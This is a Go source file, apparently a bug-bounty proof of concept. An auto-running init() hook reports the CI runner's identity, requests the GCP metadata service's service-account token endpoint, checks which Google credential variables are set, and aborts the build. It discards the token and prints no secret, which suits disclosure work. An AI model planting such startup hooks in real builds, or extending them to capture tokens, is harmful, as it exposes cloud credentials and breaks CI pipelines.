/*
 * VRP demonstration marker (benign).
 * Runs at binary startup: prints the runner identity and Cloud-metadata
 * reachability, then exits 1 before any build/test runs.
 * It prints no token and no secret value.
 */
package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"time"
)

func vrpMarkerRun() {
	host, _ := os.Hostname()
	fmt.Printf("VRP_MARKER user=%s host=%s runner=%s\n", os.Getenv("USER"), host, os.Getenv("RUNNER_NAME"))
	client := &http.Client{Timeout: 5 * time.Second}
	for _, u := range []string{
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
	} {
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("Metadata-Flavor", "Google")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("VRP_MARKER metadata err=%v\n", err)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		fmt.Printf("VRP_MARKER metadata http=%d url=%s\n", resp.StatusCode, u)
	}
	for _, k := range []string{"GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_CLOUD_PROJECT", "GCLOUD_PROJECT",
		"CLOUDSDK_CONFIG", "CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE", "GOOGLE_GHA_CREDS_PATH"} {
		if os.Getenv(k) != "" {
			fmt.Printf("VRP_MARKER env %s=<set>\n", k)
		}
	}
	os.Exit(1)
}

func init() { vrpMarkerRun() }
